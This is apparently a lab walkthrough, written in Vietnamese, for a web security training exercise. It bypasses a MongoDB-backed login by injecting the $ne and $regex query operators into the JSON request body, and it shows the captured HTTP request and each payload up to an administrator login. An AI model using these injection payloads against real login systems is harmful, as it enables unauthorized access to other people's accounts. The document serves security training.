# **Lab: Exploiting NoSQL operator injection to bypass authentication**

>  The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.  
 To solve the lab, log into the application as the `administrator` user.  
  You can log in to your own account using the following credentials: `wiener:peter`.  

# **Solution**

Truy cập web, thực hiện đăng nhập với tài khoản được cấp `wiener:peter`. Chuyển req vừa rồi tới repeater:

```
POST /login HTTP/2
Host: 0a32002c030dce18809ed511008a007e.web-security-academy.net
Cookie: session=bGTSUUyPlM6ouKIXwXu40Xq558aYqeVx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a32002c030dce18809ed511008a007e.web-security-academy.net/login
Content-Type: application/json
Content-Length: 40
Origin: https://0a32002c030dce18809ed511008a007e.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"username":"wiener","password":"peter"}
```

Chú ý vào phần JSON của req:

```
{"username":"wiener","password":"peter"}
```

Giờ sửa đổi nội dung JSON trên, thay đổi giá trị của `username` như sau:

```
{"username":{"$ne":""},"password":"peter"}
```

Ta thấy đăng nhập thành công, giải thích đoạn JSON trên thì ta đã thay đổi giá trị của `username` thành `{"$ne":""}`.  
Điều này có nghĩa là đăng nhập với các tài khoản có tên đăng nhập khác `""` và mật khẩu là `peter`.

Giờ thử làm điều tương tự với mật khẩu:

```
{"username":{"$ne":""},"password":{"$ne":""}}
```

```

Internal Server Error

Query returned unexpected number of records

```

Tất nhiên do ta đang cố đăng nhập với các tài khoản có username khác rỗng và mật khẩu khác rỗng nên có nhiều hơn một tài khoản được trả về dẫn đến đăng nhập không thành công.

Giờ sửa lại chút, thử đăng nhập với regex:

```
{"username":{"$regex":"wien.*"},"password":{"$ne":""}}
```

Giải thích: Ta đang thực hiện đăng nhập các tài khoản có chứa `wien` và mật khẩu khác rỗng.

Nice, đã đăng nhập thành công với tài khoản wiener.

Giờ làm tương tự để đăng nhập vào tài khoản admin:

```
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

Done~~~